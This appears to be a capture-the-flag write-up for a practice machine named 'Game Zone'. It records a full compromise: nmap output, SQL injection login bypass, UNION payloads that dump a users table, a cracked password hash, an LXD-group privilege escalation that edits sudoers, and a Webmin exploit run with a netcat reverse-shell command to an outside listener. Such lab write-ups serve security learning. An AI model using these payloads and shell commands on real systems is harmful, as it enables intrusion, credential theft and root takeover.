## MACHINE IP
```bash
10.201.14.235
```
## NMAP SCAN
```bash
# Nmap 7.95 scan initiated Thu Sep 25 18:40:43 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 10.201.14.235
Nmap scan report for 10.201.14.235
Host is up (0.29s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Game Zone
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 25 18:41:49 2025 -- 1 IP address (1 host up) scanned in 66.60 seconds

```
## OPEN PORTS - ANALYSIS
```bash
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```
## RECON
```bash
# Operating System                 // Found Post Initial Foothold
Linux gamezone 4.4.0-159-generic #187-Ubuntu 
# Credentials
agent47:videogamer124               // Found Post SQLi
```
## ENUMERATION
```bash
# Port 80 - Enumeration
- Login Page asks username and password 
- Try SQLi Authentication Bypass

# SQLi Payload used on username 
' OR 1=1#  

- Redirectos to   http://10.201.14.235/portal.php
- On the Search Input Pass the same payload ' OR 1=1#  
- It returns all 
  
# SQLi - Check the printable listing number 
' UNION SELECT 1#
' UNION SELECT 1,2#
' UNION SELECT 1,2,3#

- Using payload ' UNION SELECT 1,2,3# - able to print the numbers 2,3
  
# Check available databases
' UNION SELECT 1,TABLE_SCHEMA,3 FROM information_schema.tables#
Title 	                Review
information_schema	      3
db	                      3
mysql	                  3
performance_schema	      3
sys	                      3  

# List tables in all databases
' UNION SELECT 1,TABLE_SCHEMA,TABLE_NAME FROM information_schema.tables#

# Sus Tables 
Database           Table
db                  post
db                  users
mysql               user

# List the columns inside the table users
' UNION (SELECT 1,COLUMN_NAME,3 FROM information_schema.columns WHERE TABLE_NAME = 'users')#

- Found colums username and pwd

#  List the contents of the colums username and pwd
' UNION (SELECT 1,username,pwd FROM users)#

# Got Credentials
agent47:ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14

# Crack the hash using crackstation
videogamer124

# Creds 
agent47:videogamer124
```
## INITIAL SHELL
```bash
# Creds 
agent47:videogamer124

sudo ssh agent47@$ip
```
## PRIVILEGE ESCALATION
```bash
# LXD Group PrivEsc 
agent47@gamezone:~$ id
uid=1000(agent47) gid=1000(agent47) groups=1000(agent47),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

- Member of lxd group 

# PrivEsc Steps
# Source
https://github.com/saghul/lxd-alpine-builder
- git clone and rename to alpine.tar.gz
- host the file on python server and transfer alpine.tar.gz /tmp

# STEP 1
lxd init
(all default options)

# STEP 2
lxc image import ./alpine.tar.gz --alias privesc

# STEP 3 (CHECK THE IMAGE HAS BEEN IMPORTED)
lxc image list

# STEP 4 (setting container with high privileges)
lxc init privesc privesc-container -c security.privileged=true

# STEP 5 (CHECK CONTAINER)
lxc list

# STEP 6 (mount the root directory to container)
lxc config device add privesc-container mydevice disk source=/ path=/mnt/root recursive=true

# STEP 7
lxc start privesc-container
lxc list

# STEP 8 ( command execution inside container)
lxc exec privesc-container /bin/sh

# STEP 9
cd /mnt/root/etc/
echo "agent47    ALL=(ALL:ALL) ALL"  >> sudoers

- Now as user agent47 we can execute all root commands as sudo user
  
# ROOT
agent47@gamezone:~$ sudo -l
[sudo] password for agent47: 
Matching Defaults entries for agent47 on gamezone:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User agent47 may run the following commands on gamezone:
    (ALL : ALL) ALL
agent47@gamezone:~$ sudo su
root@gamezone:/home/agent47# id
uid=0(root) gid=0(root) groups=0(root)
```
## METHOD II - WEBMIN
```bash
- Check Internal open ports
agent47@gamezone:~$ ss -antlp
State       Recv-Q Send-Q                                                 Local Address:Port                                                                Peer Address:Port              
LISTEN      0      80                                                         127.0.0.1:3306                                                                           *:*                  
LISTEN      0      128                                                                *:10000                                                                          *:*                  
LISTEN      0      128                                                                *:22                                                                             *:*                  
LISTEN      0      128                                                   fe80::1%lxdbr0:13128                                                                         :::*                  
LISTEN      0      128                                                               :::80                                                                            :::*                  
LISTEN      0      128                                                               :::22                                                                            :::*                  

# Port Forwarding - to access the port 10000
sudo ssh -N -L 10000:127.0.0.1:10000 agent47@$ip

- Now access http://127.0.0.1:10000
- Use credentials  agent47:videogamer124
- Can see webmin 1.580  
  
# Found Exploit for 1.580
https://github.com/JohnHammond/CVE-2012-2982

# Run the Exploit
python3 CVE-2012-2982.py -t 127.0.0.1 -p 10000 -U agent47 -P videogamer124 -c 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.80.25 80 >/tmp/f' 
```
## ROOT | ADMINISTRATOR - PWNED
```bash
sudo nc -nvlp 80  
listening on [any] 80 ...
connect to [10.13.80.25] from (UNKNOWN) [10.201.14.235] 47262
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# uname -a
Linux gamezone 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
# ifconfig
eth0      Link encap:Ethernet  HWaddr 16:ff:e2:21:11:49  
          inet addr:10.201.14.235  Bcast:10.201.127.255  Mask:255.255.128.0
          inet6 addr: fe80::14ff:e2ff:fe21:1149/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:74414 errors:0 dropped:0 overruns:0 frame:0
          TX packets:72452 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:6650108 (6.6 MB)  TX bytes:4365586 (4.3 MB)

```
